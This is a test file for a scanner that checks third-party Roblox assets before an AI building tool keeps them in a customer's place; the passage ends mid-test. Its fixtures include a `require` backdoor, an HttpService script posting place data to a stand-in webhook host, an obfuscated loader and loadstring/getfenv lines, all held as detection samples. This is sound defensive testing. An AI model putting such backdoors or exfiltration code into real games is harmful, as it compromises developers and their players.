// THE SAFETY SUITE for inserted third-party geometry.
//
// WHAT THIS FILE IS. `asset-qc.test.mjs` pins the gate that runs BEFORE anything is fetched —
// provenance, type, price, creator. This file pins what happens AFTER something lands in a
// customer's place: the script scanner, the style ranker, and the broker that sequences them.
// The scanner is the security-critical half and gets the most tests, because it is the last thing
// standing between a stranger's Luau and someone's game.
//
// THE FIVE FIXTURES the brief names are all here and all named in their test titles: a clean model,
// a model with a plain script, a `require(12345)` backdoor, an obfuscated blob, and an HTTP-calling
// script. They are exercised twice — once through `scanScriptSource` directly, and once end-to-end
// through `brokerAsset` against a fake Studio, so the policy is proven at the unit AND at the
// pipeline level.
//
// §6 IS THE ONE THAT WOULD HAVE CAUGHT THE GAP. Everything above proved the scanner works; none of
// it proved the scanner RUNS. The scanner shipped with 47 passing tests and zero call sites, while
// the live `insert_asset` inserted on the metadata gate alone and never read the place back. So §6
// drives the real tool through the real dispatcher: a green §1-§5 with a rewired §6 is the exact
// state this file used to be in, and now it fails.
//
// §7-§10 ARE THE OTHER DOORS. §6 proves `insert_asset` is gated; it proves nothing about the ways
// into a place that do not go through `insert_asset`, and there were three. §7 pins the filter on
// `run_luau`, which handed the model's Luau to the plugin and would run `game:GetObjects` — and
// pins just as hard that ordinary building Luau still runs, because a guard that costs the escape
// hatch is not a fix. §8 pins provenance behaviour against what `insert_asset`'s description now
// claims, after the description promised a refusal the code could not perform. §9 drives the real
// worker: `/api/admin/studio-op` forwarded any op it was handed, `insert_asset` included. §10 pins
// that the system prompt and the tools tell the model the same story.
//
// NO NETWORK. Every function under test takes an injected `fetchImpl` or an injected bridge, and
// §6 replaces `globalThis.fetch` at module scope for the tool path. Two dedicated tests assert that
// nothing reached apis.roblox.com for real — the fakes record every URL they are asked for. §9
// imports the worker as a Hono app over a fake SESSION_DO, so it makes no request at all.
//
// Run: node --test packages/evals/src/asset-safety.test.mjs
import test from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const HERE = dirname(fileURLToPath(import.meta.url));
const WORKER = join(HERE, '..', '..', '..', 'apps', 'worker');
const dir = mkdtempSync(join(tmpdir(), 'golem-asset-safety-'));
const out = join(dir, 'assets.mjs');
// assets.ts deliberately has no runtime imports, so a plain transpile is the whole build.
execFileSync(join(WORKER, 'node_modules', '.bin', 'esbuild'), [join(WORKER, 'src', 'assets.ts'), '--format=esm', '--outfile=' + out], { stdio: 'pipe', cwd: WORKER });

const A = await import(out);
// tools.ts is the LIVE call site. The scanner above is only worth testing because something calls
// it, so §6 drives the real `insert_asset` through the real dispatcher rather than re-testing the
// primitives it composes. This needs --bundle; assets.ts above does not, and that difference is the
// whole reason the two are built separately.
const toolsOut = join(dir, 'tools.mjs');
execFileSync(join(WORKER, 'node_modules', '.bin', 'esbuild'), [join(WORKER, 'src', 'tools.ts'), '--bundle', '--format=esm', '--target=es2022', '--outfile=' + toolsOut], { stdio: 'pipe', cwd: WORKER });
const T = await import(toolsOut);
const {
  scanScriptSource,
  scanInsertedHierarchy,
  scanToText,
  worseSeverity,
  SCAN_LIMITS,
  scoreAssetStyle,
  rankAssetsByStyle,
  styleGateBlocks,
  BRIGHT_SIMULATOR,
  describeAssetRequest,
  inspectCreator,
  isSafeLuauPath,
  buildNormaliseLuau,
  parseNormaliseResult,
  summariseTree,
  brokerAsset,
  BROKER_STEPS,
} = A;

// ==============================================================================================
// Fixtures — the five models the brief names.
// ==============================================================================================

/** A plain gameplay script. Nothing malicious in it; it is still Luau, so it is still removed. */
const PLAIN_SCRIPT = `-- spins the model slowly
local part = script.Parent
while true do
	part.CFrame = part.CFrame * CFrame.Angles(0, 0.01, 0)
	task.wait()
end
`;

/** The classic Roblox backdoor: a module pulled off the marketplace at runtime. */
const REQUIRE_BACKDOOR = `local a = require(3163717554)
a.load(game, "owner")
`;

/** The same backdoor with the id hidden behind a variable — still unresolvable, still refused. */
const REQUIRE_INDIRECT = `local id = 316 .. 3717554
require(tonumber(id))
`;

/** Exfiltration: reads the place and posts it somewhere. */
const HTTP_SCRIPT = `local HttpService = game:GetService("HttpService")
local payload = HttpService:JSONEncode({ place = game.PlaceId })
HttpService:PostAsync("https://example-collector.invalid/api/webhooks/abc", payload)
`;

/** An obfuscated blob: one enormous line, escapes, concat chains, a base64-shaped payload. */
const OBFUSCATED = [
  'local v0=function(...)return(...)end;',
  'local s="' + '\\x68\\x74\\x74\\x70'.repeat(40) + '";',
  'local b="' + 'QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVph'.repeat(6) + '";',
  'local n=' + Array.from({ length: 12 }, (_, i) => `"p${i}"`).join('..') + ';',
].join('');

const cleanModel = { rootPath: 'game.Workspace.Rock', scripts: [], instanceClasses: ['Model', 'MeshPart', 'MeshPart'] };

// ==============================================================================================
// 1. The scanner — per script
// ==============================================================================================

test('A CLEAN MODEL IS THE ONLY THING THAT COMES BACK auto-insertable', () => {
  const scan = scanInsertedHierarchy(cleanModel);
  assert.equal(scan.verdict, 'clean');
  assert.equal(scan.autoInsertable, true);
  assert.equal(scan.scriptCount, 0);
  assert.deepEqual(scan.removePaths, []);
  assert.equal(scan.severity, 'none');
});

test('A MODEL WITH A PLAIN, HARMLESS SCRIPT IS STILL NEVER AUTO-INSERTED', () => {
  const scan = scanInsertedHierarchy({
    rootPath: 'game.Workspace.Spinner',
    scripts: [{ path: 'game.Workspace.Spinner.Spin', className: 'Script', source: PLAIN_SCRIPT }],
    instanceClasses: ['Model', 'Part', 'Script'],
  });
  assert.equal(scan.autoInsertable, false, 'a script of any kind blocks auto-insertion');
  assert.equal(scan.verdict, 'stripped');
  assert.deepEqual(scan.removePaths, ['game.Workspace.Spinner.Spin']);
  // Nothing in it is actually malicious, so it must NOT be escalated to a whole-asset discard.
  assert.equal(scan.severity, 'medium');
  assert.equal(scan.scripts[0].findings.every((f) => f.code === 'script_present'), true);
});

test('THE require(12345) BACKDOOR is critical, names itself, and quotes the line', () => {
  const s = scanScriptSource('game.Workspace.Tree.Main', 'Script', REQUIRE_BACKDOOR);
  const f = s.findings.find((x) => x.code === 'require_asset_id');
  assert.ok(f, 'the asset-id require must be found');
  assert.equal(f.severity, 'critical');
  assert.equal(f.line, 1);
  assert.match(f.excerpt, /require\(3163717554\)/);
  assert.match(f.message, /backdoor/i);
  assert.equal(s.severity, 'critical');
});

test('a require whose id is assembled at runtime is still refused — ambiguity is not a pass', () => {
  const s = scanScriptSource('game.Workspace.X.M', 'ModuleScript', REQUIRE_INDIRECT);
  const codes = s.findings.map((f) => f.code);
  assert.ok(codes.includes('require_dynamic'), 'an unresolvable require must be flagged');
  assert.equal(s.severity, 'critical');
});

test('a legitimate require of the asset\'s own tree is not itself a risk finding', () => {
  const s = scanScriptSource('game.Workspace.Kit.Init', 'ModuleScript', 'local cfg = require(script.Parent.Config)\nreturn cfg\n');
  assert.deepEqual(s.findings.map((f) => f.code), ['script_present'], 'path-shaped requires add no extra risk');
  // ...but it is still Luau, so it is still removed.
  assert.equal(s.action, 'remove');
});

test('AN HTTP-CALLING SCRIPT is caught by service, by call, and by URL', () => {
  const s = scanScriptSource('game.Workspace.Chair.Report', 'Script', HTTP_SCRIPT);
  const codes = new Set(s.findings.map((f) => f.code));
  assert.ok(codes.has('http_service'), 'HttpService use must be flagged');
  assert.ok(codes.has('url_literal'), 'the hard-coded URL must be flagged');
  assert.equal(s.severity, 'critical');
  const webhook = s.findings.find((f) => f.code === 'url_literal' && f.severity === 'critical');
  assert.ok(webhook, 'a /api/webhooks/ URL is the exfiltration endpoint and is critical, not merely high');
});

test('AN OBFUSCATED BLOB is caught on shape alone, with no vocabulary to match on', () => {
  const s = scanScriptSource('game.Workspace.Thing.Loader', 'Script', OBFUSCATED);
  const obf = s.findings.filter((f) => f.code === 'obfuscation');
  assert.ok(obf.length >= 2, `expected several shape signals, got ${obf.map((f) => f.message).join(' | ')}`);
  assert.equal(s.severity, 'critical');
  assert.ok(obf.some((f) => /characters/.test(f.message)), 'the packed line must be reported');
  assert.ok(obf.some((f) => /escapes/.test(f.message)), 'the escape ratio must be reported');
});

test('loadstring / getfenv / setfenv are critical wherever they appear', () => {
  for (const line of ['loadstring(x)()', 'getfenv(1).print = nil', 'setfenv(f, {})']) {
    const s = scanScriptSource('p', 'Script', line);
    assert.ok(s.findings.some((f) => f.code === 'dynamic_code' && f.severity === 'critical'), line);
  }
});

test('a script that reaches for ServerScriptService is critical — that is where a backdoor installs', () => {
  const s = scanScriptSource('p', 'Script', 'script.Parent = game:GetService("ServerScriptService")');
  const codes = new Set(s.findings.map((f) => f.code));
  assert.ok(codes.has('server_container'));
  assert.ok(codes.has('reparent_self'));
  assert.equal(s.severity, 'critical');
});

test('remotes and purchase prompts are flagged in an asset that should be inert', () => {
  const s = scanScriptSource('p', 'LocalScript', 'local r = Instance.new("RemoteEvent")\nMarketplaceService:PromptGamePassPurchase(p, 1)\n');
  const codes = new Set(s.findings.map((f) => f.code));
  assert.ok(codes.has('remote_traffic'));
  assert.ok(codes.has('marketplace_prompt'));
});

test('AN UNREADABLE SOURCE IS THE WORST CASE, NOT THE EMPTY ONE', () => {
  const s = scanScriptSource('game.Workspace.X.Hidden', 'Script', null);
  assert.equal(s.severity, 'critical');
  assert.equal(s.findings[0].code, 'unreadable');
  const scan = scanInsertedHierarchy({ rootPath: 'game.Workspace.X', scripts: [{ path: 'game.Workspace.X.Hidden', className: 'Script', source: null }] });
  assert.equal(scan.verdict, 'reject', 'code nobody can read means the whole asset goes');
});

test('an empty source is NOT the same as an unreadable one', () => {
  const s = scanScriptSource('p', 'Script', '');
  assert.equal(s.severity, 'medium');
  assert.equal(s.findings.some((f) => f.code === 'unreadable'), false);
});

// ==============================================================================================
// 2. The scanner — hierarchy level and the reject/strip boundary
// ==============================================================================================

test('any critical finding escalates from "strip the script" to "discard the asset"', () => {
  const scan = scanInsertedHierarchy({
    rootPath: 'game.Workspace.Tree',
    scripts: [{ path: 'game.Workspace.Tree.Main', className: 'Script', source: REQUIRE_BACKDOOR }],
    instanceClasses: ['Model', 'Part', 'Script'],
  });
  assert.equal(scan.verdict, 'reject');
  assert.equal(scan.autoInsertable, false);
  assert.match(scan.reasons.join(' '), /not fixed by deleting a script/);
});

test('a RemoteEvent with no script at all is still flagged — nothing needs Luau to be suspicious', () => {
  const scan = scanInsertedHierarchy({ rootPath: 'game.Workspace.Crate', scripts: [], instanceClasses: ['Model', 'Part', 'RemoteEvent'] });
  assert.equal(scan.verdict, 'stripped');
  assert.equal(scan.autoInsertable, false);
  assert.ok(scan.findings.some((f) => f.code === 'remote_traffic'));
});

test('an unenumerable hierarchy is rejected — unknown contents are never treated as empty', () => {
  const scan = scanInsertedHierarchy({ rootPath: 'game.Workspace.Big', scripts: [], enumerationFailed: true });
  assert.equal(scan.verdict, 'reject');
  assert.ok(scan.findings.some((f) => f.code === 'unreadable'));
});

test('more scripts than the scan cap is refused on count alone, not partially cleared', () => {
  const scripts = Array.from({ length: SCAN_LIMITS.maxScripts + 5 }, (_, i) => ({ path: `game.Workspace.M.S${i}`, className: 'Script', source: PLAIN_SCRIPT }));
  const scan = scanInsertedHierarchy({ rootPath: 'game.Workspace.M', scripts });
  assert.equal(scan.verdict, 'reject');
  assert.equal(scan.scripts.length, SCAN_LIMITS.maxScripts);
});

test('an enormous source is refused rather than partially scanned', () => {
  const s = scanScriptSource('p', 'Script', 'print("x")\n'.repeat(Math.ceil(SCAN_LIMITS.maxSourceChars / 10) + 100));
  assert.equal(s.severity, 'critical');
  assert.ok(s.findings.some((f) => /only the first/.test(f.message)));
});

test('the scanner never throws, whatever it is handed', () => {
  for (const junk of ['\u0000\u0001\u0002', '\\', '((((((', 'require(', 'ÿ'.repeat(5000)]) {
    assert.doesNotThrow(() => scanScriptSource('p', 'Script', junk));
  }
  assert.doesNotThrow(() => scanInsertedHierarchy({ rootPath: '', scripts: [] }));
});

test('excerpts are capped and stripped of control characters, so a scan is always safe to display', () => {
  const s = scanScriptSource('p', 'Script', 'require(1234567) --' + '\u0007A'.repeat(500));
  for (const f of s.findings) {
    assert.ok(f.excerpt.length <= SCAN_LIMITS.excerptChars, `excerpt was ${f.excerpt.length} chars`);
    assert.equal(/[\u0000-\u001f\u007f]/.test(f.excerpt), false, 'control characters must be stripped');
  }
});

test('scanToText renders every finding and never leaks a full source', () => {
  const scan = scanInsertedHierarchy({ rootPath: 'game.Workspace.T', scripts: [{ path: 'game.Workspace.T.S', className: 'Script', source: HTTP_SCRIPT }] });
  const text = scanToText(scan);
  assert.match(text, /REJECT/);
  assert.match(text, /http_service/);
  assert.ok(text.length < 4000, 'a scan rendering has to fit in a tool result');
});

test('worseSeverity is a total order, so roll-ups cannot disagree with themselves', () => {
  assert.equal(worseSeverity('low', 'critical'), 'critical');
  assert.equal(worseSeverity('high', 'medium'), 'high');
  assert.equal(worseSeverity('medium', 'medium'), 'medium');
});

// ==============================================================================================
// 3. The style ranker (§41)
// ==============================================================================================

const LOWPOLY_CHAIR = {
  assetId: 1,
  name: 'Low Poly Chair',
  triangles: 320,
  hasTexture: false,
  materials: ['SmoothPlastic'],
  dominantColours: [[0.78, 0.85, 0.34], [0.48, 0.73, 0.29]],
  boundsStuds: [3, 4, 3],
  partCount: 5,
  intent: 'chair',
};

const PHOTOREAL_CHAIR = {
  assetId: 2,
  name: 'Photorealistic PBR Armchair 4K Scanned',
  triangles: 48000,
  hasTexture: true,
  textureResolution: 4096,
  materials: ['Marble', 'Glass'],
  dominantColours: [[0.24, 0.22, 0.21], [0.31, 0.29, 0.28]],
  boundsStuds: [3, 4, 3],
  partCount: 1,
  intent: 'chair',
};

test('THE HEADLINE: a photoreal PBR chair loses to a low-poly one in a bright simulator', () => {
  const ranked = rankAssetsByStyle([PHOTOREAL_CHAIR, LOWPOLY_CHAIR], BRIGHT_SIMULATOR);
  assert.equal(ranked[0].candidate.assetId, LOWPOLY_CHAIR.assetId, 'the low-poly chair must rank first');
  assert.equal(ranked[0].score.verdict, 'strong');
  assert.equal(ranked[1].score.verdict, 'reject');
  assert.ok(ranked[0].score.total > ranked[1].score.total + 30, 'the separation must be wide, not marginal');
});

test('the photoreal chair fails DETERMINISTICALLY — no model call is needed to reject it', () => {
  const score = scoreAssetStyle(PHOTOREAL_CHAIR, BRIGHT_SIMULATOR);
  const blocks = styleGateBlocks(score);
  assert.ok(blocks.length >= 3, `expected several hard fails, got ${blocks.join(' | ')}`);
  assert.ok(blocks.some((b) => /texture/i.test(b)), 'a texture map in a flat-shaded style is a hard fail');
  assert.ok(blocks.some((b) => /Marble|Glass|realistic material/i.test(b)), 'a realistic material is an automatic fail (§9)');
  assert.ok(blocks.some((b) => /triangle/i.test(b)), '48k triangles for a prop is a hard fail');
});

test('a desaturated or dark asset is a hard fail — the category has no muted palette and no dark mode', () => {
  const grey = scoreAssetStyle({ ...LOWPOLY_CHAIR, dominantColours: [[0.35, 0.35, 0.36]] }, BRIGHT_SIMULATOR);
  assert.ok(grey.hardFails.some((f) => /saturation/i.test(f)));
  const dark = scoreAssetStyle({ ...LOWPOLY_CHAIR, dominantColours: [[0.05, 0.12, 0.06]] }, BRIGHT_SIMULATOR);
  assert.ok(dark.hardFails.some((f) => /brightness|dark/i.test(f)));
});

test('an asset lying on its side fails scale outright', () => {
  const fallen = scoreAssetStyle({ ...LOWPOLY_CHAIR, intent: 'tree', boundsStuds: [40, 12, 40], triangles: 900 }, BRIGHT_SIMULATOR);
  assert.ok(fallen.hardFails.some((f) => /lying on its side/i.test(f)));
  assert.equal(fallen.verdict, 'reject');
});

test('hard-failed candidates always sort last, even when their weighted total is respectable', () => {
  const mediocre = { assetId: 3, name: 'plain block', triangles: 3900, hasTexture: false, materials: ['Plastic'], boundsStuds: [3, 4, 3], intent: 'chair', dominantColours: [[0.6, 0.78, 0.3]] };
  const ranked = rankAssetsByStyle([PHOTOREAL_CHAIR, mediocre], BRIGHT_SIMULATOR);
  assert.equal(ranked[0].candidate.assetId, 3);
  assert.equal(ranked[1].candidate.assetId, 2);
});

test('unknowns score 0.5 and are REPORTED as unknown — never silently treated as good', () => {
  const bare = scoreAssetStyle({ assetId: 9, name: 'thing' }, BRIGHT_SIMULATOR);
  assert.equal(bare.hardFails.length, 0, 'nothing measured means nothing can hard-fail');
  assert.ok(bare.confidence < 0.4, `confidence should be low, was ${bare.confidence}`);
  assert.ok(bare.axes.some((a) => /unknown|no dominant|no bounding|not (?:reported|measured)/i.test(a.reason)));
  assert.notEqual(bare.verdict, 'strong', 'an unmeasured asset is never "strong"');
});

test('every axis carries a weight, the weights sum to 1, and every axis states a reason', () => {
  const score = scoreAssetStyle(LOWPOLY_CHAIR, BRIGHT_SIMULATOR);
  const sum = score.axes.reduce((a, x) => a + x.weight, 0);
  assert.ok(Math.abs(sum - 1) < 1e-9, `weights summed to ${sum}`);
  for (const a of score.axes) {
    assert.ok(a.reason.length > 10, `${a.axis} has no reason`);
    assert.ok(a.score >= 0 && a.score <= 1, `${a.axis} out of range`);
  }
});

test('the calibrated target is the style spec: its palette is the §1 environment table', () => {
  assert.equal(BRIGHT_SIMULATOR.flatShaded, true);
  assert.ok(BRIGHT_SIMULATOR.palette.length >= 8);
  // #5FC94A, the grass row of the table, in Color3 0..1.
  const grass = BRIGHT_SIMULATOR.palette.find((c) => Math.abs(c[0] - 0x5f / 255) < 1e-9 && Math.abs(c[1] - 0xc9 / 255) < 1e-9);
  assert.ok(grass, 'the grass hex from ROBLOX-STYLE-SPEC §1 must be in the palette');
  assert.ok(BRIGHT_SIMULATOR.bannedMaterials.includes('Marble'));
});

// ==============================================================================================
// 3B. The COHERENCE gate (§42) — "does this belong with what is already here?"
//
// WHY THIS SECTION EXISTS. §3 above is green, and the map it produced was rejected on sight: "the
// world reads too much like multiple unrelated free assets placed into one map". Every asset in it
// had passed the ranker. The ranker was not broken — it was answering an ABSOLUTE question ("is
// this cartoon-compatible?") when the failure was RELATIVE ("does this belong with the eleven
// things already standing here?").
//
// So every test below is written to fail if the gate ever collapses back into an absolute rule.
// The load-bearing one is `THE SAME ASSET, TWO CONTEXTS`: one candidate, unchanged, coherent in a
// meadow and refused in a frost biome. No absolute rule can produce that, which is exactly why it
// is the test that proves the gate is doing the new job rather than a rename of the old one.
//
// The four hard fails the owner named from the screenshots are each pinned by name below: frost
// contamination (B), silhouette mismatch (C/E's detail density), scale disagreement (F), and grey
// unstyled props (G).
// ==============================================================================================

/** The eleven-ish assets already standing in the meadow: flat-shaded, saturated, low-poly. */
const MEADOW_SET = [
  { assetId: 11, name: 'Stylised Oak', triangles: 340, hasTexture: false, dominantColours: [[0.24, 0.62, 0.31], [0.48, 0.32, 0.19]], boundsStuds: [12, 22, 12], intent: 'tree' },
  { assetId: 12, name: 'Stylised Pine', triangles: 300, hasTexture: false, dominantColours: [[0.34, 0.72, 0.35]], boundsStuds: [10, 20, 10], intent: 'tree' },
  { assetId: 13, name: 'Round Rock', triangles: 180, hasTexture: false, dominantColours: [[0.72, 0.75, 0.77]], boundsStuds: [4, 3, 4], intent: 'rock' },
  { assetId: 14, name: 'Wooden Crate', triangles: 120, hasTexture: false, dominantColours: [[0.79, 0.55, 0.30]], boundsStuds: [4, 4, 4], intent: 'crate' },
  { assetId: 15, name: 'Painted Fence', triangles: 260, hasTexture: false, dominantColours: [[0.85, 0.72, 0.42]], boundsStuds: [8, 6, 1], intent: 'fence' },
];

/** HSV saturation, so a test can assert a retint actually moved off neutral. */
const hsvSaturation = (c) => (Math.max(...c) === 0 ? 0 : (Math.max(...c) - Math.min(...c)) / Math.max(...c));

const meadow = () => A.buildPaletteContext('meadow', MEADOW_SET);
const frost = () => A.buildPaletteContext('frost', []);

/** A newcomer that was authored for the same map: same density, same palette, same tier. */
const COHERENT_BUSH = {
  assetId: 21,
  name: 'Stylised Shrub',
  triangles: 260,
  hasTexture: false,
  dominantColours: [[0.30, 0.68, 0.33]],
  boundsStuds: [4, 4, 4],
  intent: 'bush',
};

test('a coherent asset passes: same density, same palette, same player-relative tier', () => {
  const v = A.scoreAssetCoherence(COHERENT_BUSH, meadow());
  assert.equal(v.verdict, 'coherent', A.coherenceToText(v));
  assert.deepEqual(v.blockers, []);
  assert.equal(v.transform, null);
  assert.ok(v.total >= A.COHERENCE_FLOOR, `${v.total} should clear the ${A.COHERENCE_FLOOR} floor`);
  assert.ok(v.confidence > 0.8, `it was fully measured, so confidence should be high, was ${v.confidence}`);
});

test('HARD FAIL C/E: a photoreal high-poly asset among flat-shaded ones is refused for detail density', () => {
  const photoreal = { ...COHERENT_BUSH, assetId: 22, name: 'Scanned Granite Boulder', intent: 'rock', triangles: 40000, hasTexture: false, dominantColours: [[0.66, 0.70, 0.72]] };
  const v = A.scoreAssetCoherence(photoreal, meadow());
  assert.equal(v.verdict, 'incoherent', A.coherenceToText(v));
  assert.ok(v.blockers.some((b) => /detail density|silhouette/i.test(b)), `expected a silhouette/detail-density blocker, got: ${v.blockers.join(' | ')}`);
  // Non-vacuity: a rock three times as dense as its neighbours is BUSY, not incoherent. The gate
  // must separate "more detailed than the set" from "from another game", or it culls everything.
  const busy = { ...photoreal, triangles: 900 };
  assert.notEqual(A.scoreAssetCoherence(busy, meadow()).verdict, 'incoherent', 'a merely busier asset must survive');
  assert.equal(v.transform, null, 'nothing here decimates a mesh, so no transform may be offered');
  // And the point of the gate: the ABSOLUTE ranker would not have said this on its own.
  const silhouette = v.axes.find((a) => a.axis === 'silhouette');
  assert.match(silhouette.reason, /x the accepted median/, 'the reason must be relative to the accepted set, not to a fixed budget');
});

test('HARD FAIL B: a lime-green asset offered to the frost biome is refused for palette contamination', () => {
  const limeBush = { assetId: 23, name: 'Bright Lime Bush', triangles: 280, hasTexture: false, dominantColours: [[0.45, 0.85, 0.20]], boundsStuds: [4, 4, 4], intent: 'bush' };
  const v = A.scoreAssetCoherence(limeBush, frost());
  assert.equal(v.verdict, 'incoherent', A.coherenceToText(v));
  assert.ok(v.reasons.some((r) => /palette contamination/i.test(r)), `expected a palette reason, got: ${v.reasons.join(' | ')}`);
  assert.ok(v.blockers.some((b) => /identity colour/i.test(b)), 'foliage green is the object\'s identity, so a retint is not the fix — removal is');
  assert.equal(v.transform, null);
});

test('THE SAME ASSET, TWO CONTEXTS: coherent in the meadow, refused in the frost biome', () => {
  const inMeadow = A.scoreAssetCoherence(COHERENT_BUSH, meadow());
  const inFrost = A.scoreAssetCoherence(COHERENT_BUSH, frost());
  assert.equal(inMeadow.verdict, 'coherent');
  assert.equal(inFrost.verdict, 'incoherent');
  // This is the whole difference between this gate and the style ranker above: the ranker cannot
  // tell these two apart, because nothing about the ASSET changed.
  const style = A.scoreAssetStyle({ ...COHERENT_BUSH, materials: ['SmoothPlastic'] }, A.BRIGHT_SIMULATOR);
  assert.equal(style.hardFails.length, 0, 'the absolute style gate is happy either way — that is the gap this section closes');
});

test('HARD FAIL G: a grey, unstyled prop is TRANSFORMED with a retint, not rejected', () => {
  const greyFence = { assetId: 24, name: 'Fence', triangles: 240, hasTexture: false, dominantColours: [[0.58, 0.58, 0.59]], boundsStuds: [8, 6, 1], intent: 'fence' };
  const v = A.scoreAssetCoherence(greyFence, meadow());
  assert.equal(v.verdict, 'transform', A.coherenceToText(v));
  assert.equal(v.transform.kind, 'retint');
  assert.deepEqual(v.blockers, []);
  assert.ok(v.reasons.some((r) => /grey|unstyled|saturation/i.test(r)), v.reasons.join(' | '));
  // The retint must be an actual improvement, and must not be the approved grey it already is.
  assert.ok(v.transform.colour, 'a retint must name the colour to move to');
  assert.ok(hsvSaturation(v.transform.colour) >= 0.3, `a retint onto another neutral fixes nothing; saturation was ${hsvSaturation(v.transform.colour).toFixed(2)}`);
  assert.ok(v.transform.projectedTotal > v.total, `the projection must beat the current score: ${v.transform.projectedTotal} vs ${v.total}`);
});

test('a DELIBERATE neutral is not a grey prop: the set approves the stone it already painted', () => {
  // The grey-prop rule and the stone palette pull in opposite directions, and getting this wrong
  // either lets factory grey through or repaints the scene's own stone lime. The line is precedent:
  // sitting ON an approved colour is exempt, being merely near one is not.
  const stone = { assetId: 41, name: 'Boulder', triangles: 200, hasTexture: false, dominantColours: [[0.72, 0.75, 0.77]], boundsStuds: [4, 3, 4], intent: 'rock' };
  const painted = A.scoreAssetCoherence(stone, meadow());
  assert.equal(painted.verdict, 'coherent', A.coherenceToText(painted));
  assert.match(painted.axes.find((a) => a.axis === 'saturation').reason, /deliberate/);
  // Factory part grey is close enough to the stone to be "in palette" and is still refused, which
  // is the whole reason the exemption uses a tighter test than the palette axis does.
  const factory = { ...stone, assetId: 42, dominantColours: [[0.58, 0.58, 0.59]] };
  const v = A.scoreAssetCoherence(factory, meadow());
  assert.equal(v.verdict, 'transform', A.coherenceToText(v));
  assert.equal(v.transform.kind, 'retint');
});

test('the projected total is COMPUTED by re-scoring the transformed asset, not asserted', () => {
  const greyFence = { assetId: 24, name: 'Fence', triangles: 240, hasTexture: false, dominantColours: [[0.58, 0.58, 0.59]], boundsStuds: [8, 6, 1], intent: 'fence' };
  const ctx = meadow();
  const v = A.scoreAssetCoherence(greyFence, ctx);
  const after = A.scoreAssetCoherence({ ...greyFence, dominantColours: [v.transform.colour] }, ctx);
  assert.ok(Math.abs(after.total - v.transform.projectedTotal) < 1e-9, `projection ${v.transform.projectedTotal} must equal the re-score ${after.total}`);
  assert.equal(after.verdict, 'coherent', 'and applying the suggested transform must actually make it coherent');
});

test('a textured mesh among untextured ones is flagged UNRECOLOURABLE and refused', () => {
  const textured = { ...COHERENT_BUSH, assetId: 25, name: 'Textured Shrub', hasTexture: true };
  const v = A.scoreAssetCoherence(textured, meadow());
  assert.equal(v.unrecolourable, true, 'a baked texture is beyond the reach of every colour repair this gate has');
  assert.equal(v.verdict, 'incoherent', A.coherenceToText(v));
  assert.ok(v.blockers.some((b) => /unrecolourable/i.test(b)), v.blockers.join(' | '));
  assert.ok(v.reasons.some((r) => /read foreign/i.test(r)));
});

test('...unless the texture can be cleared in place, which turns it into a DROP_TEXTURE transform', () => {
  const removable = { ...COHERENT_BUSH, assetId: 26, name: 'Textured Shrub', hasTexture: true, textureRemovable: true };
  const v = A.scoreAssetCoherence(removable, meadow());
  assert.equal(v.unrecolourable, true, 'it is still unrecolourable AS IT STANDS — that is why the fix is removal of the texture');
  assert.equal(v.verdict, 'transform');
  assert.equal(v.transform.kind, 'drop_texture');
  assert.deepEqual(v.blockers, []);
});

test('HARD FAIL F: scale is judged against a PLAYER-RELATIVE tier, and ONE tier out is a rescale', () => {
  // A tree at head height. The absolute envelope in SCALE_ENVELOPES catches the extremes; this
  // catches the thing the owner actually saw, which is props disagreeing with EACH OTHER.
  const shortTree = { assetId: 27, name: 'Stylised Oak', triangles: 320, hasTexture: false, dominantColours: [[0.30, 0.66, 0.32]], boundsStuds: [6, 10, 6], intent: 'tree' };
  const v = A.scoreAssetCoherence(shortTree, meadow());
  assert.equal(v.verdict, 'transform', A.coherenceToText(v));
  assert.equal(v.transform.kind, 'rescale');
  assert.ok(v.transform.scale > 2, `a 10-stud tree beside 22-stud ones needs a real correction, got ${v.transform.scale}`);
  assert.match(v.axes.find((a) => a.axis === 'scale_tier').reason, /players tall/, 'the unit must be the player, not the stud');
  assert.equal(A.tierForHeight(4), 'waist');
  assert.equal(A.tierForHeight(22), 'canopy');
  assert.equal(A.expectedTier('tree').tier, 'canopy');
  assert.equal(A.expectedTier('crate').tier, 'waist');
});

test('...but TWO tiers out is a cull: a uniform scale carries the detail density with it', () => {
  const dwarfTree = { assetId: 30, name: 'Stylised Oak', triangles: 320, hasTexture: false, dominantColours: [[0.30, 0.66, 0.32]], boundsStuds: [4, 4, 4], intent: 'tree' };
  const v = A.scoreAssetCoherence(dwarfTree, meadow());
  assert.equal(v.verdict, 'incoherent', A.coherenceToText(v));
  assert.ok(v.blockers.some((b) => /tiers out/i.test(b)), v.blockers.join(' | '));
  assert.equal(v.transform, null, 'a 7x blow-up is not a fix, it is a different asset');
});

test('two DIFFERENT corrections is a cull, not a patch — "a smaller coherent palette beats a larger one"', () => {
  // Grey (needs a retint) AND one tier too tall (needs a rescale). Either alone is fixable.
  const twoProblems = { assetId: 28, name: 'Fence', triangles: 240, hasTexture: false, dominantColours: [[0.58, 0.58, 0.59]], boundsStuds: [8, 20, 1], intent: 'fence' };
  const v = A.scoreAssetCoherence(twoProblems, meadow());
  assert.equal(v.verdict, 'incoherent', A.coherenceToText(v));
  assert.ok(v.blockers.some((b) => /different corrections/i.test(b)), v.blockers.join(' | '));
});

test('an unmeasured candidate ABSTAINS rather than being refused — unknown is never a failure', () => {
  const v = A.scoreAssetCoherence({ assetId: 29, name: 'thing' }, meadow());
  assert.equal(v.abstained, true);
  assert.equal(v.verdict, 'coherent', 'the gate must not refuse what it could not measure');
  assert.deepEqual(v.blockers, []);
  assert.ok(v.confidence < 0.4, `confidence should be low, was ${v.confidence}`);
  assert.ok(v.reasons.some((r) => /abstained/i.test(r)), v.reasons.join(' | '));
});

test('the context is built from the accepted set: colours already standing in the map are approved', () => {
  const ctx = meadow();
  assert.equal(ctx.sampleSize, MEADOW_SET.length);
  assert.equal(ctx.flatShaded, true);
  assert.equal(ctx.medianTriangles, 260);
  assert.ok(ctx.approvedColours.length > A.BIOME_PROFILES.meadow.palette.length, 'the accepted set must widen the palette');
  // The warm fence gold is nowhere in the biome profile; it is approved because it is already there.
  const gold = ctx.approvedColours.find((c) => Math.abs(c[0] - 0.85) < 1e-9 && Math.abs(c[1] - 0.72) < 1e-9);
  assert.ok(gold, 'a colour measured off an accepted asset must join the approved set');
  // But precedent does NOT widen the contamination bands.
